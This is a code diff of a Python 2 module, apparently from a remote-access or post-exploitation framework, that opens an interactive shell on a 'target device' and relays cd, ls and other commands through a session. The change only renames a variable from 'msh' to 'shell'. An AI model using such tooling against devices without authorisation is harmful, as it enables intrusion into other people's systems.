@@ -4,7 +4,7 @@ import os
 
 class command:
     def __init__(self):
-        self.name = "msh"
+        self.name = "shell"
         self.description = "Open target device shell."
     
     def run(self,session,cmd_data):
@@ -16,23 +16,23 @@ class command:
 		whoami = "$ "
 	while 1:
 	    #prepare command
-	    msh = raw_input(h.RED+session.username+"@"+session.hostname+h.WHITE+":"+session.current_directory+whoami)
-	    if not msh or msh.replace(" ","") == "":
+	    shell = raw_input(h.RED+session.username+"@"+session.hostname+h.WHITE+":"+session.current_directory+whoami)
+	    if not shell or shell.replace(" ","") == "":
 	        continue
-	    mshd = msh.split()[0]
-	    mshd_data = {"cmd": mshd, "args":msh[len(mshd) + 1:]}
-	    if mshd == "cd":
-		result = json.loads(session.send_command(mshd_data))
+	    shelld = shell.split()[0]
+	    shelld_data = {"cmd": shelld, "args":shell[len(shelld) + 1:]}
+	    if shelld == "cd":
+		result = json.loads(session.send_command(shelld_data))
                 if 'error' in result:
         	    h.info_error(result['error'])
                 elif 'current_directory' in result:
         	    session.current_directory = result['current_directory'].encode('utf-8')
                 else:
         	     h.info_error('Unable to get current directory!')
-	    if mshd == "ls":
-                if not mshd_data['args']:
-                    mshd_data['args'] = '.'
-                data = session.send_command(mshd_data)
+	    if shelld == "ls":
+                if not shelld_data['args']:
+                    shelld_data['args'] = '.'
+                data = session.send_command(shelld_data)
                 try:
                     contents = json.loads(data)
                 except:
@@ -45,13 +45,13 @@ class command:
                         print h.COLOR_INFO + k + h.ENDC
                     else:
                         print k
-	    if mshd == "exit":
+	    if shelld == "exit":
                 return
 	    else:
 		try:
-		    result = session.send_command(mshd_data)
+		    result = session.send_command(shelld_data)
 		    if result:
-		        if mshd == "ls" or mshd == "cd":
+		        if shelld == "ls" or shelld == "cd":
 			    pass
 			else:
 			    print result.rstrip()
